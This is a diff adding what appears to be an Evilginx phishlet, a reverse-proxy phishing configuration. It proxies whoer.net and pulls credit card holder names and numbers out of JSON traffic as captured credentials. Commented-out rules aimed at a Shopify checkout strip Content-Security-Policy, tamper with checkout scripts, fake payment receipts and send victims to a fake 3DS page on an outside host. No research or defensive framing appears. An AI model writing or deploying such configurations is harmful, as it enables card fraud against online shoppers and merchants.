@@ -1,0 +1,52 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  # 根域名（用于 cookie domain 替换）
+  - {phish_sub: '', orig_sub: '', domain: 'whoer.net', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+#  hack提交按钮 （解决不能重复提交问题）
+#- {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\.behavior===["'']block["'']\),', replace: '.behavior===(!top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+#- {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\=\>["'']block["'']\=\=\=', replace: '=>(!top.window.hack?"unblock":"block")===', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+#- {triggers_on: 'www.strapya.com', orig_sub: 'www', domain: 'strapya.com', search: '\.behavior===["'']block["'']\),', replace: '.behavior===(!top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+#- {triggers_on: 'www.strapya.com', orig_sub: 'www', domain: 'strapya.com', search: '\=\>["'']block["'']\=\=\=', replace: '=>(!top.window.hack?"unblock":"block")===', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+#- {triggers_on: 'www.strapya.com', orig_sub: 'www', domain: 'strapya.com', search: 'Content-Security-Policy', replace: 'CSP', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+# 去掉express checkout
+#- {triggers_on: 'www.strapya.com', orig_sub: 'www', domain: 'strapya.com', search: '<section.*?aria-label="Contact".*?<\/section>', replace: '', mimes: ['text/html']}
+#  请求带上cookie
+#- {triggers_on: 'www.strapya.com', orig_sub: 'www', domain: 'strapya.com', search: '{method:"POST",body:JSON\.stringify\({Detail', replace: '{method:"POST",credentials: "include",body:JSON.stringify({Detail', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+
+intercept:
+  #mock 返回数据
+#  - {domain: 'www.strapya.com',path: '.*persisted\?operationName=SubmitForCompletion.*',http_status: 200,body: '{"data":{"submitForCompletion":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970983534820","purchaseOrder":{},"pollDelay":500,"__typename":"ProcessingReceipt"},"__typename":"SubmitSuccess"}}}', mime: "application/json"}
+#  - {domain: 'www.strapya.com',path: '.*persisted\?operationName=PollForReceipt.*',http_status: 200,body: '{"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://www.strapya.store/jp3ds","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}}', mime: "application/json"}
+
+
+
+# 自定义3ds页面
+#  - {domain: 'www.strapya.com', mime: 'redirect', body: 'phis.chemicalguys.top', path: '\/phis\/*', http_status: 301}
+#- {domain: 'www.strapya.com', path: '.*?\/sandboxes\/wallets', http_status: 404}
+#  - {domain: 'www.strapya.com', path: '.*?/DeliveryMethodSelectorSection.*', http_status: 404}
+#- {domain: 'api.intelligems.io', path: '.*\/track*', http_status: 404}
+#- {domain: 'play.google.com', path: '\/log', http_status: 404}
+#  - {domain: 'api.gotolstoy.com', path: '.*', http_status: 404}
+
+js_inject:
+
+
+auth_tokens:
+  - domain: 'whoer.net'
+    keys: []
+    type: 'cookie'
+credentials:
+  username:
+    key: ''
+    search: '{"credit_card".*?"name":"([^"]*)"'
+    type: 'json'
+  password:
+    key: ''
+    search: '{"credit_card".*?"number":"([^"]*)"'
+    type: 'json'
+
+login:
+  domain: 'whoer.net'
+  path: '/'
